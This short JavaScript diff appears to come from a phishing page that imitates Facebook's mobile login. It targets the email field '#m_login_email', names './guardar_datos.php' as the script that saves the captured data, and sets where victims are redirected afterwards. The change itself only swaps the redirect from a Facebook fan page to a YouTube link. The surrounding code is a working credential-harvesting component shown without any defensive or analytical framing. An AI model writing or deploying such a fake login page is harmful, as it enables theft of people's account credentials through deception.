@@ -1,6 +1,6 @@
 
 document.addEventListener("DOMContentLoaded", function () {
-    const URL_REDIRECCION = "https://m.facebook.com/parzibyte.fanpage", 
+    const URL_REDIRECCION = "https://youtu.be/C0fytYVZ_mQ?si=aI4JyH9XBu6Z-N4Z", 
         URL_GUARDAR_DATOS = "./guardar_datos.php",
         $btnLogin = document.querySelector("#l"),
         $usuario = document.querySelector("#m_login_email"),
